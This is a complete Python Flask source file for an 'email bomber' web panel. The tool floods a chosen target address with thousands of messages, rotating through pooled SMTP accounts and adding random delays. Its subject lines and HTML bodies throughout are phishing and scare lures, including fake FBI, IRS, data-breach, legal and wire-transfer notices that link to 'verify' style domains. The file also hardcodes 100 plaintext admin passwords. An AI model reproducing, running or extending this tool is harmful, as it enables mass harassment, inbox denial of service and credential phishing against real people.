# app.py - Email Bomber Web Panel v3.0
# Flask + SQLite + Multi-SMTP Rotation + Bootstrap
# ============================================================

from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import smtplib
import threading
import time
import random
import os
import hashlib

app = Flask(__name__)
app.secret_key = 'ROOT_SYSTEM_2026_SECRET_KEY_V2_BRUTAL'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///bomber.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ============================================================
# DATABASE MODELS
# ============================================================

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)

class SMTP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    host = db.Column(db.String(100), nullable=False)
    port = db.Column(db.Integer, nullable=False)
    username = db.Column(db.String(100), nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(20), default='active')
    used_count = db.Column(db.Integer, default=0)

class Attack(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target = db.Column(db.String(100), nullable=False)
    amount = db.Column(db.Integer, nullable=False)
    sent = db.Column(db.Integer, default=0)
    failed = db.Column(db.Integer, default=0)
    status = db.Column(db.String(20), default='pending')
    started_at = db.Column(db.DateTime, default=datetime.utcnow)
    finished_at = db.Column(db.DateTime, nullable=True)

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def get_active_smtps():
    return SMTP.query.filter_by(status='active').all()

def send_email_smtp(smtp_config, target, subject, message, from_name="ROOT SYSTEM"):
    try:
        server = smtplib.SMTP(smtp_config.host, smtp_config.port, timeout=30)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(smtp_config.username, smtp_config.password)

        msg = f'''From: {from_name} <{smtp_config.username}>
To: {target}
Subject: {subject}
Content-Type: text/html; charset=utf-8

{message}
'''

        server.sendmail(smtp_config.username, target, msg.encode('utf-8'))
        server.quit()

        smtp_config.used_count += 1
        db.session.commit()
        return True

    except Exception as e:
        print(f"[SMTP ERROR] {smtp_config.host}: {e}")
        smtp_config.used_count += 1
        if smtp_config.used_count % 3 == 0:
            smtp_config.status = 'inactive'
        db.session.commit()
        return False

def generate_subject():
    subjects = [
        "🚨 SECURITY BREACH DETECTED - Immediate Action Required",
        "⚠️ Your Account Has Been Compromised",
        "🔴 FINAL WARNING: Account Suspension Pending",
        "💀 Your Data Has Been Leaked - Verify Now",
        "🚨 Unauthorized Login Attempt - 27 Failed Logins",
        "⚠️ IRS Investigation Opened Against You",
        "🔴 FBI Cybercrime Division - Case File #{}".format(random.randint(10000, 99999)),
        "💀 Your Password Expires In 24 Hours",
        "🚨 $10,000 Transfer Pending Verification",
        "⚠️ Child Support Enforcement Action Filed"
    ]
    return random.choice(subjects)

def generate_body(target):
    bodies = [
        """<html><body>
        <h2 style="color:#cc0000;">🚨 CRITICAL SECURITY ALERT</h2>
        <p>We have detected <strong>27 failed login attempts</strong> to your account from multiple locations.</p>
        <p><strong>Locations:</strong> Russia 🇷🇺, Nigeria 🇳🇬, Brazil 🇧🇷</p>
        <p>If you do not verify your identity within <strong>2 HOURS</strong>, your account will be <strong>PERMANENTLY SUSPENDED</strong>.</p>
        <p><a href="http://verify-identity-{}.com" style="color:#cc0000; font-weight:bold;">VERIFY NOW →</a></p>
        <p style="color:#666;">This is an automated security message.</p>
        </body></html>""".format(random.randint(10000, 99999)),

        """<html><body>
        <h2 style="color:#cc0000;">💀 DATA BREACH EXPOSURE</h2>
        <p>Your personal information has been found in a major data breach:</p>
        <ul>
            <li>Email: {}</li>
            <li>Social Security Number: PARTIALLY EXPOSED</li>
            <li>Credit Card: ***-***-***-{}</li>
        </ul>
        <p>Click below to check if you are affected and protect your identity.</p>
        <p><a href="http://breach-check-{}.com" style="color:#cc0000; font-weight:bold;">CHECK EXPOSURE →</a></p>
        </body></html>""".format(target, random.randint(1000, 9999), random.randint(10000, 99999)),

        """<html><body>
        <h2 style="color:#cc0000;">⚠️ LEGAL ACTION INITIATED</h2>
        <p>A formal complaint has been filed against this email address regarding intellectual property infringement.</p>
        <p><strong>Case Number:</strong> #IP-{}</p>
        <p><strong>Damages Claimed:</strong> ${},{}</p>
        <p>To dispute this claim and avoid default judgment, respond within 48 hours.</p>
        <p><a href="http://legal-response-{}.com" style="color:#cc0000; font-weight:bold;">RESPOND TO COMPLAINT →</a></p>
        </body></html>""".format(random.randint(100000, 999999), random.randint(10, 500), random.randint(0, 99), random.randint(10000, 99999)),

        """<html><body>
        <h2 style="color:#cc0000;">🚨 PAYMENT OF ${},{} BLOCKED</h2>
        <p>A wire transfer to your account in the amount of <strong>${},{}</strong> has been placed on hold by the Federal Reserve.</p>
        <p><strong>Reason:</strong> Suspicious activity report filed.</p>
        <p>To release the funds, verify your banking details immediately.</p>
        <p><a href="http://release-funds-{}.com" style="color:#cc0000; font-weight:bold;">VERIFY & RELEASE →</a></p>
        </body></html>""".format(random.randint(50, 500), random.randint(0, 99), random.randint(50, 500), random.randint(0, 99), random.randint(10000, 99999)),

        """<html><body>
        <h2 style="color:#cc0000;">💀 WARNING: RANSOMWARE DETECTED</h2>
        <p>Security systems have detected ransomware attempting to encrypt files connected to this email.</p>
        <p><strong>Affected Files:</strong> {} files</p>
        <p><strong>Encryption Key Expires:</strong> 6 hours</p>
        <p>Prevent permanent data loss by securing your account now.</p>
        <p><a href="http://stop-ransomware-{}.com" style="color:#cc0000; font-weight:bold;">SECURE MY FILES →</a></p>
        </body></html>""".format(random.randint(100, 5000), random.randint(10000, 99999))
    ]
    return random.choice(bodies)

# ============================================================
# BACKGROUND TASK
# ============================================================

attack_threads = {}

def run_attack(attack_id):
    with app.app_context():
        attack = Attack.query.get(attack_id)
        if not attack:
            return

        attack.status = 'running'
        db.session.commit()

        smtp_configs = get_active_smtps()
        if not smtp_configs:
            attack.status = 'failed'
            attack.finished_at = datetime.utcnow()
            db.session.commit()
            return

        sent = 0
        failed = 0
        smtp_index = 0

        while sent < attack.amount:
            smtp = smtp_configs[smtp_index % len(smtp_configs)]
            smtp_index += 1

            subject = generate_subject()
            body = generate_body(attack.target)

            if send_email_smtp(smtp, attack.target, subject, body):
                sent += 1
            else:
                failed += 1

            attack.sent = sent
            attack.failed = failed
            db.session.commit()

            time.sleep(random.uniform(0.3, 1.5))

            if failed > len(smtp_configs) * 10:
                break

        attack.status = 'completed'
        attack.finished_at = datetime.utcnow()
        db.session.commit()

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if 'admin' not in session:
        return redirect(url_for('login'))
    attacks = Attack.query.order_by(Attack.started_at.desc()).limit(20).all()
    smtps = SMTP.query.all()
    return render_template('dashboard.html', attacks=attacks, smtps=smtps)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        admin = Admin.query.filter_by(username=username, password=password).first()
        if admin:
            session['admin'] = username
            flash('Welcome back, boss!', 'success')
            return redirect(url_for('index'))
        flash('Invalid credentials, bitch.', 'danger')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect(url_for('login'))

@app.route('/smtp/add', methods=['POST'])
def add_smtp():
    if 'admin' not in session:
        return redirect(url_for('login'))

    smtp_data = request.form.get('smtp_list', '')
    lines = smtp_data.strip().split('\n')

    count = 0
    for line in lines:
        line = line.strip()
        if not line:
            continue

        if '|' in line:
            parts = line.split('|')
        elif ':' in line:
            parts = line.split(':')
        else:
            continue

        if len(parts) >= 4:
            host = parts[0].strip()
            try:
                port = int(parts[1].strip())
            except ValueError:
                continue
            username = parts[2].strip()
            password = parts[3].strip()

            existing = SMTP.query.filter_by(host=host, username=username).first()
            if not existing:
                smtp = SMTP(host=host, port=port, username=username, password=password)
                db.session.add(smtp)
                count += 1

    try:
        db.session.commit()
        flash(f'{count} SMTPs added!', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error: {e}', 'danger')

    return redirect(url_for('index'))

@app.route('/smtp/delete/<int:smtp_id>')
def delete_smtp(smtp_id):
    if 'admin' not in session:
        return redirect(url_for('login'))

    smtp = SMTP.query.get(smtp_id)
    if smtp:
        try:
            db.session.delete(smtp)
            db.session.commit()
            flash('SMTP deleted', 'success')
        except Exception as e:
            db.session.rollback()
            flash(f'Error: {e}', 'danger')

    return redirect(url_for('index'))

@app.route('/attack/start', methods=['POST'])
def start_attack():
    if 'admin' not in session:
        return redirect(url_for('login'))

    target = request.form.get('target')
    try:
        amount = int(request.form.get('amount'))
    except (TypeError, ValueError):
        amount = 100

    attack = Attack(target=target, amount=amount)
    db.session.add(attack)
    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        flash(f'Error: {e}', 'danger')
        return redirect(url_for('index'))

    thread = threading.Thread(target=run_attack, args=(attack.id,))
    thread.daemon = True
    thread.start()
    attack_threads[attack.id] = thread

    flash(f'Attack launched on {target}! 💀', 'success')
    return redirect(url_for('index'))

@app.route('/attack/status/<int:attack_id>')
def attack_status(attack_id):
    if 'admin' not in session:
        return jsonify({'error': 'unauthorized'}), 401

    attack = Attack.query.get(attack_id)
    if not attack:
        return jsonify({'error': 'not found'}), 404

    return jsonify({
        'status': attack.status,
        'sent': attack.sent,
        'failed': attack.failed,
        'amount': attack.amount
    })

# ============================================================
# USERS (100 USERS)
# ============================================================

USERS = [
    ("root", "ROOT@2026#X"),
    ("admin", "Admin!Secure#99"),
    ("kali", "HackThePlanet#42"),
    ("boss", "MoneyMaker$77"),
    ("dark", "ShadowOps#13"),
    ("ghost", "Invisible#666"),
    ("phantom", "StrikeBack#01"),
    ("viper", "VenomPit#88"),
    ("cobra", "SilentBite#56"),
    ("eagle", "SkyHunter#23"),
    ("wolf", "PackLeader#11"),
    ("dragon", "FireBreath#99"),
    ("tiger", "JungleKing#45"),
    ("lion", "ManeEvent#67"),
    ("shark", "DeepWater#34"),
    ("snake", "FangStrike#78"),
    ("spider", "WebMaster#12"),
    ("batman", "DarkKnight#90"),
    ("joker", "ChaosTheory#55"),
    ("neo", "MatrixMode#21"),
    ("morpheus", "RedPill#33"),
    ("trinity", "BlackCat#44"),
    ("cypher", "Betrayal#66"),
    ("apollo", "RocketFuel#77"),
    ("ares", "WarGod#88"),
    ("zeus", "ThunderBolt#99"),
    ("hades", "Underworld#00"),
    ("poseidon", "OceanKing#11"),
    ("hermes", "SpeedDemon#22"),
    ("athena", "WisdomSeek#33"),
    ("kratos", "GodSlayer#44"),
    ("doom", "HellFire#55"),
    ("venom", "Symbiote#66"),
    ("carnage", "ChaosKing#77"),
    ("thanos", "SnapFinger#88"),
    ("loki", "Trickster#99"),
    ("thor", "HammerTime#00"),
    ("odin", "AllFather#11"),
    ("freya", "Valkyrie#22"),
    ("ragnar", "VikingKing#33"),
    ("sigma", "LoneWolf#44"),
    ("alpha", "TopDog#55"),
    ("omega", "EndGame#66"),
    ("delta", "ForceDelta#77"),
    ("bravo", "MissionGo#88"),
    ("charlie", "AlphaChar#99"),
    ("foxtrot", "SilentMove#00"),
    ("ghostrider", "FlameOn#11"),
    ("punisher", "NoMercy#22"),
    ("daredevil", "BlindJustice#33"),
    ("ironman", "SuitUp#44"),
    ("hulk", "SmashTime#55"),
    ("captain", "ShieldUp#66"),
    ("wolverine", "ClawsOut#77"),
    ("deadpool", "Chimichanga#88"),
    ("magneto", "MetalBend#99"),
    ("professor", "MindControl#00"),
    ("storm", "WeatherWar#11"),
    ("cyclops", "LaserEye#22"),
    ("nightcrawler", "Teleport#33"),
    ("gambit", "CardThrow#44"),
    ("rogue", "PowerSteal#55"),
    ("beast", "BrainPower#66"),
    ("iceman", "FrostBite#77"),
    ("colossus", "MetalSkin#88"),
    ("shadowcat", "PhaseWalk#99"),
    ("mystique", "ShapeShift#00"),
    ("sabertooth", "FuryClaw#11"),
    ("thedarkone", "Abyss#666"),
    ("nightmare", "SleepWalk#77"),
    ("destructor", "TotalLoss#88"),
    ("annihilator", "ZeroMercy#99"),
    ("exterminator", "CleanSweep#00"),
    ("dominator", "TotalControl#11"),
    ("overlord", "SupremeRule#22"),
    ("warlord", "BattleCry#33"),
    ("emperor", "EmpireBuild#44"),
    ("kingpin", "CrimeBoss#55"),
    ("scarface", "SayHello#66"),
    ("godfather", "FamilyFirst#77"),
    ("mafia", "Omerta#88"),
    ("cartel", "ElPatron#99"),
    ("bandito", "Bandolero#00"),
    ("pistolero", "QuickDraw#11"),
    ("revolver", "SixShots#22"),
    ("shotgun", "DoubleBarrel#33"),
    ("sniper", "OneShotKill#44"),
    ("assassin", "SilentKill#55"),
    ("hitman", "ContractDone#66"),
    ("executioner", "FinalCut#77"),
    ("reaper", "SoulCollect#88"),
    ("deathstroke", "Terminator#99"),
    ("nightblade", "DarkEdge#00"),
    ("shadowblade", "SilentSteel#11"),
    ("bloodfang", "RedBite#22"),
    ("darkfang", "BlackBite#33"),
    ("ironsoul", "MetalHeart#44"),
    ("frozenheart", "ColdSoul#55"),
    ("burningrage", "HotAnger#66")
]

def init_db():
    with app.app_context():
        db.create_all()

        # Create all users
        for username, password in USERS:
            if not Admin.query.filter_by(username=username).first():
                admin = Admin(username=username, password=password)
                db.session.add(admin)

        try:
            db.session.commit()
            print(f"[+] Created {len(USERS)} users")
            print("[+] Root login: root / ROOT@2026#X")
            print("[+] Admin login: admin / Admin!Secure#99")
        except Exception as e:
            db.session.rollback()
            print(f"[-] DB Error: {e}")

# ============================================================
# TEMPLATES
# ============================================================

TEMPLATES = {
    'login.html': '''<!DOCTYPE html>
<html>
<head>
    <title>ROOT SYSTEM - Email Bomber</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ff00; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: monospace; }
        .login-box { background: #0a0a0a; padding: 40px; border-radius: 15px; width: 100%; max-width: 400px; border: 2px solid #00ff00; box-shadow: 0 0 30px #00ff00; }
        .btn-primary { background: #00ff00; color: #000; border: none; width: 100%; padding: 12px; font-weight: bold; font-size: 18px; }
        .btn-primary:hover { background: #00cc00; }
        input { background: #111 !important; color: #00ff00 !important; border: 1px solid #00ff00 !important; font-family: monospace; }
        h2 { text-align: center; margin-bottom: 30px; color: #00ff00; font-weight: bold; }
        .alert-danger { background: #330000; color: #ff0000; border: 1px solid #ff0000; }
        .alert-success { background: #003300; color: #00ff00; border: 1px solid #00ff00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>⚡ ROOT SYSTEM<br>EMAIL BOMBER v3.0</h2>
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% for category, message in messages %}
                <div class="alert alert-{{ category }}">{{ message }}</div>
            {% endfor %}
        {% endwith %}
        <form method="POST">
            <div class="mb-3">
                <label class="form-label">Username</label>
                <input type="text" name="username" class="form-control" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Password</label>
                <input type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-primary">ACCESS</button>
        </form>
    </div>
</body>
</html>''',

    'dashboard.html': '''<!DOCTYPE html>
<html>
<head>
    <title>ROOT SYSTEM - Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; }
        .container { max-width: 1200px; margin-top: 30px; }
        .card { background: #0a0a0a; border: 1px solid #00ff00; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 0 15px #00ff00; }
        .btn-primary { background: #00ff00; color: #000; border: none; font-weight: bold; }
        .btn-primary:hover { background: #00cc00; }
        .btn-success { background: #00ff00; color: #000; border: none; font-weight: bold; }
        .btn-danger { background: #ff0000; border: none; font-weight: bold; color: #fff; }
        input, textarea, select { background: #111 !important; color: #00ff00 !important; border: 1px solid #00ff00 !important; font-family: monospace; }
        h1, h3 { color: #00ff00; font-weight: bold; }
        .stats-box { text-align: center; padding: 20px; background: #0a0a0a; border-radius: 10px; border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .stats-box h4 { color: #00ff00; font-size: 28px; }
        table { color: #00ff00; }
        .badge-active { background: #00ff00; color: #000; }
        .badge-inactive { background: #ff0000; color: #fff; }
        .badge-running { background: #ff9900; color: #000; }
        .badge-completed { background: #00ff00; color: #000; }
        .text-muted { color: #00aa00 !important; }
        .alert-success { background: #003300; color: #00ff00; border: 1px solid #00ff00; }
        .alert-danger { background: #330000; color: #ff0000; border: 1px solid #ff0000; }
    </style>
</head>
<body>
    <div class="container">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h1>⚡ ROOT SYSTEM EMAIL BOMBER v3.0</h1>
            <div>
                <span class="text-muted">Logged in: <strong>{{ session.admin }}</strong></span>
                <a href="{{ url_for('logout') }}" class="btn btn-danger ms-3">LOGOUT</a>
            </div>
        </div>

        {% with messages = get_flashed_messages(with_categories=true) %}
            {% for category, message in messages %}
                <div class="alert alert-{{ category }}">{{ message }}</div>
            {% endfor %}
        {% endwith %}

        <div class="row mb-4">
            <div class="col-md-3">
                <div class="stats-box">
                    <h6>Total SMTPs</h6>
                    <h4>{{ smtps|length }}</h4>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stats-box">
                    <h6>Active SMTPs</h6>
                    <h4>{{ smtps|selectattr('status', 'equalto', 'active')|list|length }}</h4>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stats-box">
                    <h6>Total Attacks</h6>
                    <h4>{{ attacks|length }}</h4>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stats-box">
                    <h6>Total Sent</h6>
                    <h4>{{ attacks|sum(attribute='sent') }}</h4>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-md-5">
                <div class="card">
                    <h3>🎯 START ATTACK</h3>
                    <form method="POST" action="{{ url_for('start_attack') }}">
                        <div class="mb-3">
                            <label class="form-label">Target Email</label>
                            <input type="email" name="target" class="form-control" required>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Amount</label>
                            <select name="amount" class="form-control">
                                <option value="100">100</option>
                                <option value="250">250</option>
                                <option value="500">500</option>
                                <option value="1000">1000</option>
                                <option value="5000">5000</option>
                                <option value="10000">10000</option>
                            </select>
                        </div>
                        <button type="submit" class="btn btn-primary w-100">⚡ LAUNCH ATTACK</button>
                    </form>
                </div>

                <div class="card">
                    <h3>📧 ADD SMTPS</h3>
                    <form method="POST" action="{{ url_for('add_smtp') }}">
                        <div class="mb-3">
                            <label class="form-label">SMTP List (host|port|user|pass)</label>
                            <textarea name="smtp_list" class="form-control" rows="8" placeholder="mail.example.com|587|user@example.com|password"></textarea>
                        </div>
                        <button type="submit" class="btn btn-success w-100">ADD SMTPS</button>
                    </form>
                </div>
            </div>

            <div class="col-md-7">
                <div class="card">
                    <h3>📊 RECENT ATTACKS</h3>
                    <table class="table table-dark">
                        <thead>
                            <tr>
                                <th>Target</th>
                                <th>Amount</th>
                                <th>Sent</th>
                                <th>Failed</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for attack in attacks %}
                            <tr>
                                <td>{{ attack.target }}</td>
                                <td>{{ attack.amount }}</td>
                                <td>{{ attack.sent }}</td>
                                <td>{{ attack.failed }}</td>
                                <td>
                                    {% if attack.status == 'completed' %}
                                        <span class="badge badge-completed">COMPLETED</span>
                                    {% elif attack.status == 'running' %}
                                        <span class="badge badge-running">RUNNING</span>
                                    {% elif attack.status == 'failed' %}
                                        <span class="badge badge-inactive">FAILED</span>
                                    {% else %}
                                        <span class="badge badge-active">PENDING</span>
                                    {% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>

                <div class="card">
                    <h3>📧 SMTP LIST</h3>
                    <table class="table table-dark">
                        <thead>
                            <tr>
                                <th>Host</th>
                                <th>Port</th>
                                <th>Username</th>
                                <th>Used</th>
                                <th>Status</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for smtp in smtps %}
                            <tr>
                                <td>{{ smtp.host }}</td>
                                <td>{{ smtp.port }}</td>
                                <td>{{ smtp.username }}</td>
                                <td>{{ smtp.used_count }}</td>
                                <td>
                                    {% if smtp.status == 'active' %}
                                        <span class="badge badge-active">ACTIVE</span>
                                    {% else %}
                                        <span class="badge badge-inactive">INACTIVE</span>
                                    {% endif %}
                                </td>
                                <td>
                                    <a href="{{ url_for('delete_smtp', smtp_id=smtp.id) }}" class="btn btn-sm btn-danger">DELETE</a>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</body>
</html>'''
}

# ============================================================
# CREATE TEMPLATES
# ============================================================

def create_templates():
    if not os.path.exists('templates'):
        os.makedirs('templates')

    for filename, content in TEMPLATES.items():
        filepath = os.path.join('templates', filename)
        if not os.path.exists(filepath):
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"[+] Created template: {filename}")

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    create_templates()
    init_db()
    print("=" * 60)
    print("[+] ROOT SYSTEM - EMAIL BOMBER v3.0")
    print("[+] 100 Users Created")
    print("[+] Root: root / ROOT@2026#X")
    print("[+] Admin: admin / Admin!Secure#99")
    print("[+] Running: http://127.0.0.1:5000")
    print("=" * 60)
    app.run(debug=True, host='0.0.0.0', port=5000)